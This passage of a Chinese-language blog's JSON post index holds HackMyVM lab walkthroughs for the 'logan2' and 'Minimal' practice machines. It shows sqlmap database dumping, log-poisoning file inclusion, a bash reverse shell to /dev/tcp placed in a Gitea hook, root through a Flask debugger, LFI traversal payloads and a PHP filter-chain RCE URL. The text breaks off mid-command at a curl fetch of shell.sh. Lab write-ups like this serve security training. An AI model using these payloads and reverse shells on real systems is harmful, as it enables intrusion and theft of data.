T\\r\\n\\r\\n<!DOCTYPE\\x20html>\\n<html\\x20lang=\\'en-US\\'\\x20class=\\'the\nSF:me-\\'>\\n<head\\x20data-suburl=\\'\\'>\\n\\t<meta\\x20charset=\\'utf-8\\'>\\n\\t<m\nSF:eta\\x20name=\\'viewport\\'\\x20content=\\'width=device-width,\\x20initial-sc\nSF:ale=1\\'>\\n\\t<meta\\x20http-equiv=\\'x-ua-compatible\\'\\x20content=\\'ie=edg\nSF:e\\'>\\n\\t<title>Page\\x20Not\\x20Found\\x20-\\x20\\x20Gitea:\\x20Git\\x20with\\x\nSF:20a\\x20cup\\x20of\\x20tea\\x20</title>\\n\\t<link\\x20rel=\\'manifest\\'\\x20hre\nSF:f=\\'/manifest\\.json\\'\\x20crossorigin=\\'use-credentials\\'>\\n\\t<meta\\x20n\nSF:ame=\\'theme-color\\'\\x20content=\\'#6cc644\\'>\\n\\t<meta\\x20name=\\'author\\'\nSF:\\x20content=\\'Gitea\\x20-\\x20Git\\x20with\\x20a\\x20cup\\x20of\\x20tea\\'\\x20/\nSF:>\\n\\t<meta\\x20name=\\'description\\'\\x20content=\\'Gitea\\x20\\(Git\\x20with\\\nSF:x20a\\x20c');\nMAC Address: 08:00:27:B1:96:9A (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 27.94 seconds\n\n```\n\n80\u30013000\u90fd\u662fhttp\u670d\u52a1\n\n# 2.\u8e29\u70b9\n\n80\u662f\u6b22\u8fce\u9875\uff0c\u6709\u4e00\u4e2a\u811a\u672c\u30023000\u662fGitea\u901a\u5e38\u6ca1\u6d1e\uff0c\u6240\u4ee5\u6211\u4eec\u5148\u770b\u811a\u672c\n\n```bash\nhttp://192.168.205.144/script.js\n\ndocument.addEventListener('DOMContentLoaded', function() {\n    fetch('/save-user-agent.php', {\n        method: 'POST',\n        body: JSON.stringify({ user_agent: navigator.userAgent }),\n        headers: {\n            'Content-Type': 'application/json'\n        }\n    })\n    .then(response => {\n        if (response.ok) {\n            console.log('User-Agent saved successfully.');\n        } else {\n            console.error('Error saving User-Agent.');\n        }\n    })\n    .catch(error => {\n        console.error('Network error:', error);\n    });\n});\n\n```\n\n\u610f\u601d\u662f\u5b83user_agent\u53ef\u4ee5\u4ee5json\u4f20\u70b9\u4e1c\u897f\uff0c\u5f00\u4e2aburp\u8bd5\u8bd5\n\n![Image](https://github.com/user-attachments/assets/7eda310a-cb6a-4253-bcfc-7d775b7c4564)\n\nsql\u6ce8\u4e00\u4e0b\u770b\u6709\u6ca1\u6709\u4e1c\u897f\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[~/test/tmp]\n\u2514\u2500$ sqlmap -r sql.txt --batch\n        ___\n       __H__                                                                                                                         \n ___ ___[,]_____ ___ ___  {1.9#stable}                                                                                                 \n|_ -| . [,]     | .'| . |                                                                                                            \n|___|_  [']_|_|_|__,|  _|                                                                                                            \n      |_|V...       |_|   https://sqlmap.org                                                                                         \n\n[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program\n\n[*] starting @ 17:10:23 /2025-01-20/\n\n[17:10:23] [INFO] parsing HTTP request from 'sql.txt'\nJSON-like data found in GET body. Do you want to process it? [Y/n/q] Y\nCookie parameter '_csrf' appears to hold anti-CSRF token. Do you want sqlmap to automatically update it in further requests? [y/N] N\n[17:10:23] [INFO] testing connection to the target URL\n[17:10:23] [INFO] testing if the target URL content is stable\n[17:10:23] [ERROR] there was an error checking the stability of page because of lack of content. Please check the page request results (and probable errors) by using higher verbosity levels\n[17:10:23] [INFO] testing if (custom) POST parameter 'JSON-like user_agent' is dynamic\n[17:10:23] [WARNING] (custom) POST parameter 'JSON-like user_agent' does not appear to be dynamic\n[17:10:23] [WARNING] heuristic (basic) test shows that (custom) POST parameter 'JSON-like user_agent' might not be injectable\n[17:10:23] [INFO] testing for SQL injection on (custom) POST parameter 'JSON-like user_agent'\n[17:10:24] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'\n[17:10:24] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'\n[17:10:24] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'\n[17:10:24] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'\n[17:10:24] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'\n[17:10:24] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'\n[17:10:24] [INFO] testing 'Generic inline queries'\n[17:10:24] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'\n[17:10:24] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'\n[17:10:24] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'\n[17:10:24] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'\n[17:10:24] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'\n[17:10:24] [INFO] testing 'Microsoft SQL Server/Sybase time-based blind (IF)'\n[17:10:24] [INFO] testing 'Oracle AND time-based blind'\nit is recommended to perform only basic UNION tests if there is not at least one other (potential) technique found. Do you want to reduce the number of requests? [Y/n] Y\n[17:10:24] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'\n[17:10:24] [WARNING] (custom) POST parameter 'JSON-like user_agent' does not seem to be injectable\n[17:10:24] [CRITICAL] all tested parameters do not appear to be injectable. Try to increase values for '--level'/'--risk' options if you wish to perform more tests. If you suspect that there is some kind of protection mechanism involved (e.g. WAF) maybe you could try to use option '--tamper' (e.g. '--tamper=space2comment') and/or switch '--random-agent'\n\n[*] ending @ 17:10:24 /2025-01-20/\n\n\n```\n\n\u4e0d\u884c\uff0c\u81ea\u5df1\u5199\u4e00\u4e2a\u8bd5\u8bd5\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[~/test/tmp]\n\u2514\u2500$ sqlmap --url http://192.168.205.144/save-user-agent.php --method POST --data '{'user_agent':'1'}' --batch --current-db \n        ___\n       __H__                                                                                                                         \n ___ ___[']_____ ___ ___  {1.9#stable}                                                                                               \n|_ -| . [)]     | .'| . |                                                                                                            \n|___|_  [(]_|_|_|__,|  _|                                                                                                            \n      |_|V...       |_|   https://sqlmap.org                                                                                         \n\n\u7701\u7565\n[17:17:19] [INFO] adjusting time delay to 1 second due to good response times\nlogan\ncurrent database: 'logan'\n\n\u250c\u2500\u2500(kali\u327fkali)-[~/test/tmp]\n\u2514\u2500$ sqlmap --url http://192.168.205.144/save-user-agent.php --method POST --data '{'user_agent':'1'}' --batch -D logan --tables     \n        ___\n       __H__                                                                                                                         \n ___ ___[(]_____ ___ ___  {1.9#stable}                                                                                                 \n|_ -| . [(]     | .'| . |                                                                                                            \n|___|_  [']_|_|_|__,|  _|                                                                                                            \n      |_|V...       |_|   https://sqlmap.org                                                                                         \n\n\u7701\u7565\n[17:26:42] [INFO] adjusting time delay to 1 second due to good response times\n3\n[17:26:42] [INFO] retrieved: browser\n[17:27:04] [INFO] retrieved: comments\n[17:27:30] [INFO] retrieved: users\nDatabase: logan\n[3 tables]\n+----------+\n| browser  |\n| comments |\n| users    |\n+----------+\n\n\n\u250c\u2500\u2500(kali\u327fkali)-[~/test/tmp]\n\u2514\u2500$ sqlmap --url http://192.168.205.144/save-user-agent.php --method POST --data '{'user_agent':'1'}' --batch -D logan -T users --dump\n        ___\n       __H__                                                                                                                         \n ___ ___[.]_____ ___ ___  {1.9#stable}                                                                                                 \n|_ -| . [)]     | .'| . |                                                                                                            \n|___|_  [(]_|_|_|__,|  _|                                                                                                            \n      |_|V...       |_|   https://sqlmap.org                                                                                         \n\n\u7701\u7565\nDatabase: logan\nTable: users\n[1 entry]\n+------------------------------+--------+\n| email                        | user   |\n+------------------------------+--------+\n| logan@newsitelogan.logan.hmv | logan  |\n+------------------------------+--------+\n\n```\n\n\u53ea\u6709\u4e00\u4e2a\u7528\u6237\u540d\u548c\u57df\u540d\uff0c\u6211\u4eec\u5c06\u57df\u540d\u52a0\u4e0a\n\n![Image](https://github.com/user-attachments/assets/6d62fde8-9b9e-47e5-8861-1658bae184b2)\n\n\u8bd5\u8bd5\u6709\u6ca1\u6709\u6587\u4ef6\u5305\u542b\n\n![Image](https://github.com/user-attachments/assets/9660a109-bcae-4ede-ba5f-2ccf553a07ea)\n\n\u5b58\u5728\u6587\u4ef6\u5305\u542b\uff0c\u5c1d\u8bd5\u8bfb\u53d6\u5bc6\u94a5\uff0c\u65e0\u679c\u3002\u770b\u770b\u5b58\u4e0d\u5b58\u5728\u65e5\u5fd7\u6ce8\u5165\n\n![Image](https://github.com/user-attachments/assets/3b1e466f-27cd-404c-a5cc-e812af4e6cee)\n\n\u5b58\u5728\uff0c\u5c1d\u8bd5\u6ce8\u5165\n\n![Image](https://github.com/user-attachments/assets/c15708fd-3b31-4bc3-8778-6dc9da12fe2b)\n\n\u563b\u563b\n\n![Image](https://github.com/user-attachments/assets/d6647484-800d-4bf2-98c7-09e15435ff1c)\n\n\u4e0d\u563b\u563b\uff0c\u5bb9\u6613\u7684\u90fd\u7ed9\u5b83\u7981\u4e86\n\n![Image](https://github.com/user-attachments/assets/43e262e5-1441-4451-a648-11601dbdd8d7)\n\n\u8fd8\u4e00\u5206\u949f\u6e05\u4e00\u6b21\uff0c\u8003\u9a8c\u624b\u901f\u662f\u5427\uff1f\n\n![Image](https://github.com/user-attachments/assets/837e96ef-975c-44b9-a745-42b61d73363a)\n\n![Image](https://github.com/user-attachments/assets/57f4d48e-140e-4f6a-a9da-87a65a12bccd)\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ echo 'PD9waHAKCQoJJHNlcnZlcm5hbWUgPSAibG9jYWxob3N0IjsKCSR1c2VybmFtZSA9ICJsb2dhbiI7CgkkcGFzc3dvcmQgPSAiU3VwZXJfbG9nYW4xMjM0IjsKCSRkYm5hbWUgPSAibG9nYW4iOwoKCS8vIENyZWF0ZSBjb25uZWN0aW9uCgkkY29ubiA9IG5ldyBteXNxbGkoJHNlcnZlcm5hbWUsICR1c2VybmFtZSwgJHBhc3N3b3JkLCAkZGJuYW1lKTsKCS8vIENoZWNrIGNvbm5lY3Rpb24KCWlmICgkY29ubi0+Y29ubmVjdF9lcnJvcikgewoJICBkaWUoIkNvbm5lY3Rpb24gZmFpbGVkOiAiIC4gJGNvbm4tPmNvbm5lY3RfZXJyb3IpOwoJfQoKPz4K' |base64 -d\n<?php\n\n        $servername = 'localhost';\n        $username = 'logan';\n        $password = 'Super_logan1234';\n        $dbname = 'logan';\n\n        // Create connection\n        $conn = new mysqli($servername, $username, $password, $dbname);\n        // Check connection\n        if ($conn->connect_error) {\n          die('Connection failed: ' . $conn->connect_error);\n        }\n\n?>\n\n```\n\n\u767b\u5f55Gitea\n\n![Image](https://github.com/user-attachments/assets/87309749-0e27-4dc1-bf6a-09cb1b54d57c)\n\n\u6539\u4e2ashell\u4e0a\u53bb\n\n```bash\n#!/bin/sh\nbash -c 'bash -i >& /dev/tcp/192.168.205.141/8888 0>&1'\n\u7701\u7565\n```\n\n\u4ea4\u4e2a\u6587\u4ef6\u4e0a\u53bb\n\n![Image](https://github.com/user-attachments/assets/e9aaf4dc-fb75-4f1c-98d5-583ffdd77f4a)\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ nc -lvnp 8888\nlistening on [any] 8888 ...\nconnect to [192.168.205.141] from (UNKNOWN) [192.168.205.144] 55202\nbash: cannot set terminal process group (428): Inappropriate ioctl for device\nbash: no job control in this shell\ngit@logan2:~/gitea-repositories/logan/future_web.git$ id\nid\nuid=104(git) gid=113(git) groups=113(git)\n```\n\n# 3. \u83b7\u5f97\u7a33\u5b9a\u7684 Shell\n\n\u83b7\u53d6**\u53cd\u5411 shell** \u540e\uff0c\u901a\u8fc7\u4ee5\u4e0b\u547d\u4ee4\u83b7\u5f97\u7a33\u5b9a\u7684**\u4ea4\u4e92\u5f0f** **TTY shell**\uff1a\n\n```bash\nscript /dev/null -c bash  \nctrl+z  \nstty raw -echo; fg  \nreset xterm  \nexport TERM=xterm  \necho $SHELL  \nexport SHELL=/bin/bash  \nstty rows 59 cols 236\n```\n\n# 4.\u63d0\u6743\n\n```bash\ngit@logan2:~/gitea-repositories/logan/future_web.git$ sudo -l\nMatching Defaults entries for git on logan2:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin, use_pty\n\nUser git may run the following commands on logan2:\n    (ALL) NOPASSWD: /usr/bin/python3 /opt/app.py\ngit@logan2:~/gitea-repositories/logan/future_web.git$ ls -la /opt/app.py\nls: cannot access '/opt/app.py': Permission denied\ngit@logan2:~/gitea-repositories/logan/future_web.git$ cd /home/\ngit@logan2:/home$ ls -al\ntotal 20\ndrwxr-xr-x  5 root  root  4096 Sep 11  2023 .\ndrwxr-xr-x 18 root  root  4096 Aug 27  2023 ..\ndrwxr-xr-x  4 git   git   4096 Jan 20 02:58 git\ndrwx------  2 kevin kevin 4096 Sep 11  2023 kevin\ndrwx------  3 logan logan 4096 Sep 11  2023 logan\ngit@logan2:/home$ cd git/\ngit@logan2:~$ ls -al\ntotal 20\ndrwxr-xr-x 4 git  git  4096 Jan 20 02:58 .\ndrwxr-xr-x 5 root root 4096 Sep 11  2023 ..\n-rw-r--r-- 1 git  git   123 Jan 20 02:58 .gitconfig\ndrwx------ 2 git  git  4096 Aug 27  2023 .ssh\ndrwxr-xr-x 3 git  git  4096 Sep 11  2023 gitea-repositories\ngit@logan2:~$ cd /tmp/\ngit@logan2:/tmp$ ls -al\ntotal 32\ndrwxrwxrwt  8 root root 4096 Jan 20 03:53 .\ndrwxr-xr-x 18 root root 4096 Aug 27  2023 ..\ndrwxrwxrwt  2 root root 4096 Jan 20 02:58 .ICE-unix\ndrwxrwxrwt  2 root root 4096 Jan 20 02:58 .X11-unix\ndrwxrwxrwt  2 root root 4096 Jan 20 02:58 .XIM-unix\ndrwxrwxrwt  2 root root 4096 Jan 20 02:58 .font-unix\ndrwx------  3 root root 4096 Jan 20 02:58 systemd-private-0d3aa9413d3b439bb9007bce25456a9d-apache2.service-ZTwD9s\ndrwx------  3 root root 4096 Jan 20 02:58 systemd-private-0d3aa9413d3b439bb9007bce25456a9d-systemd-logind.service-6lKqu3\ngit@logan2:/tmp$ cd /mnt/\ngit@logan2:/mnt$ ls -al\ntotal 8\ndrwxr-xr-x  2 root root 4096 Aug 27  2023 .\ndrwxr-xr-x 18 root root 4096 Aug 27  2023 ..\ngit@logan2:/mnt$ cd /tmp/\ngit@logan2:/tmp$ find / -perm -4000 -type f 2>/dev/null\n/usr/lib/dbus-1.0/dbus-daemon-launch-helper\n/usr/lib/openssh/ssh-keysign\n/usr/bin/su\n/usr/bin/gpasswd\n/usr/bin/umount\n/usr/bin/chsh\n/usr/bin/sudo\n/usr/bin/mount\n/usr/bin/passwd\n/usr/bin/newgrp\n/usr/bin/chfn\ngit@logan2:/tmp$ /sbin/getcap -r / 2>/dev/null\n/usr/bin/ping cap_net_raw=ep\ngit@logan2:/tmp$ ss -tuln | grep tcp\ntcp   LISTEN 0      80         127.0.0.1:3306      0.0.0.0:*        \ntcp   LISTEN 0      128          0.0.0.0:22        0.0.0.0:*        \ntcp   LISTEN 0      128             [::]:22           [::]:*        \ntcp   LISTEN 0      511                *:80              *:*        \ntcp   LISTEN 0      4096               *:3000            *:*        \ngit@logan2:/tmp$ sudo -l\nMatching Defaults entries for git on logan2:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin, use_pty\n\nUser git may run the following commands on logan2:\n    (ALL) NOPASSWD: /usr/bin/python3 /opt/app.py\ngit@logan2:/tmp$ sudo /usr/bin/python3 /opt/app.py\n * Serving Flask app 'app'\n * Debug mode: on\nWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.\n * Running on all addresses (0.0.0.0)\n * Running on http://127.0.0.1:8000\n * Running on http://192.168.205.144:8000\nPress CTRL+C to quit\n * Restarting with stat\n * Debugger is active!\n * Debugger PIN: 632-008-714\n\n```\n\n\u719f\u6089\u7684\u914d\u65b9\uff0c\u90a3\u5c31\u7b80\u5355\u4e86\uff08PIN\u90fd\u7ed9\u4e86Debugger PIN: 632-008-714\uff09\n\n![Image](https://github.com/user-attachments/assets/ac3d324c-42a9-4b48-8e1a-999bb899c0e9)\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ nc -lvnp 8889                                  \nlistening on [any] 8889 ...\nconnect to [192.168.205.141] from (UNKNOWN) [192.168.205.144] 58630\nroot@logan2:/tmp# id\nid\nuid=0(root) gid=0(root) groups=0(root)\n\n```sentence", "top": 0, "createdAt": 1751016800, "style": "", "script": "</script><script src='https://7r1UMPHK.github.io/plugins/TOC.js'></script><script src='https://7r1UMPHK.github.io/plugins/lightbox.js'></script><script src='https://7r1UMPHK.github.io/plugins/LazyLoadImages.js'></script>", "head": "", "ogImage": "https://7r1umphk.github.io/image/20250716100121947.webp", "createdDate": "2025-06-27", "dateLabelColor": "#0969da"}, "P108": {"htmlDir": "docs/post/hmv_Minimal.html", "labels": ["HackMyVM"], "postTitle": "hmv_Minimal", "postUrl": "post/hmv_Minimal.html", "postSourceUrl": "https://github.com/7r1UMPHK/7r1UMPHK.github.io/issues/108", "commentNum": 0, "wordCount": 25612, "description": "# hmv_Minimal\n\n# 0.\u7b80\u4ecb\n\n**\u9776\u673a**\uff1a[hackmyvm - Minimal](https://hackmyvm.eu/machines/machine.php?vm=Minimal)\n**\u96be\u5ea6**\uff1a\u9ec4\u8272\n**\u76ee\u6807 IP**\uff1a192.168.205.135\n**\u672c\u673a IP**\uff1a192.168.205.141\n\n# 1.\u626b\u63cf\n\n`nmap`\u8d77\u624b\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ nmap -sS --min-rate 10000 -p- -Pn 192.168.205.135\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-01-14 14:58 CST\nNmap scan report for 192.168.205.135\nHost is up (0.00054s latency).\nNot shown: 65533 closed tcp ports (reset)\nPORT   STATE SERVICE\n22/tcp open  ssh\n80/tcp open  http\nMAC Address: 08:00:27:0D:67:64 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\n\nNmap done: 1 IP address (1 host up) scanned in 2.62 seconds\n```\n\n\u5148\u770b**80\u7aef\u53e3**\uff0c**22\u7aef\u53e3**\u5019\u8865\n\n# 2.\u8e29\u70b9\n\n![image](https://github.com/user-attachments/assets/e779669a-453f-45b8-af0d-3cbc172561ce)\n\n\uff08\u9875\u9762\u633a\u7b80\u6d01\uff09\u53d1\u73b0\u4e00\u4e2a**\u767b\u5f55\u7f51\u9875(login.php)**  \uff0c\u6d4b\u8bd5\u4e86`\u5f31\u5bc6\u7801\u3001sql\u6ce8\u5165\u3001\u4e07\u80fd\u5bc6\u7801`\u5747\u65e0\u679c\uff0c\u6ca1\u6709\u73b0\u6210\u7684\uff0c\u6211\u4eec\u81ea\u5df1\u6ce8\u518c\u4e00\u4e2a\n\n![image](https://github.com/user-attachments/assets/d57f31d8-97d2-419e-99a0-a002e6e3086d)\n\n\u6ce8\u518c\u5b8c\u4e4b\u540e\uff0c\u53ef\u4ee5\u628a\u4e00\u4e9b\u5546\u54c1\u52a0\u5165\u8d2d\u7269\u8f66\n\n![image](https://github.com/user-attachments/assets/535d5286-48d7-4a29-ae43-f3ceebf03c31)\n\n\u5f53\u4f60\u51c6\u5907\u4e70\u5355\u7684\u65f6\u5019\uff0c\u70b9\u51fb`Buy items`\u4f1a\u53d1\u73b0\uff0c\u7f51\u5740\u51fa\u73b0\u4e86\u53d8\u5316\u3002\u65b0\u7f51\u5740\u53ef\u80fd\u4f1a\u5b58\u5728\u6587\u4ef6\u5305\u542b\u6f0f\u6d1e\uff0c\u6211\u4eec\u5e2e\u4ed6\u6d4b\u8bd5\u4e00\u4e0b\u2750\u203f\u2751\n\n```bash\nhttp://192.168.205.135/shop_cart.php?action=/etc/passwd\nhttp://192.168.205.135/shop_cart.php?action=../../../../etc/passwd\nhttp://192.168.205.135/shop_cart.php?action=....//....//....//....//etc/passwd\nhttp://192.168.205.135/shop_cart.php?action=php://filter/convert.base64-encode/resource=index\n```\n\n![image](https://github.com/user-attachments/assets/d2f1f884-fd50-4efd-b512-b8667466e41e)\n\n\u6d4b\u8bd5\u4e86\u56db\u6761\uff0c\u53ea\u6709\u7b2c\u56db\u6761\u6709\u53cd\u5e94\uff0c\u6211\u4eec\u7ee7\u7eed\u5c1d\u8bd5\u53ef\u4e0d\u53ef\u4ee5\u901a\u8fc7**PHP \u8fc7\u6ee4\u5668\u94fe** \u6765\u6267\u884c\u547d\u4ee4\n\n![image](https://github.com/user-attachments/assets/845afd2d-5281-4308-8119-58e7de747b75)\n\n```bash\nhttp://192.168.205.135/shop_cart.php?action=php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.UCS2.UTF-8|convert.iconv.CSISOLATIN6.UCS-4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.iconv.UHC.CP1361|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.BIG5|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.8859_3.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.iconv.UHC.CP1361|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=php://temp&0=id\n```\n\n\uff08\u2606\u03c9\u2606*\uff09\u53ef\u4ee5\u6267\u884c\uff0c\u4f7f\u7528\u7684\u662f\u8fd9\u4e2a\u5de5\u5177 [PHP Filter Chain Generator](https://github.com/synacktiv/php_filter_chain_generator)\u3002\u6211\u4eec\u5f39\u4e2ashell\u56de\u6765\n\n```bash\nhttp://192.168.205.135/shop_cart.php?action=php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.UCS2.UTF-8|convert.iconv.CSISOLATIN6.UCS-4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.iconv.UHC.CP1361|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.BIG5|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.8859_3.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.iconv.UHC.CP1361|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=php://temp&0=curl 192.168.205.141/shell.sh -o 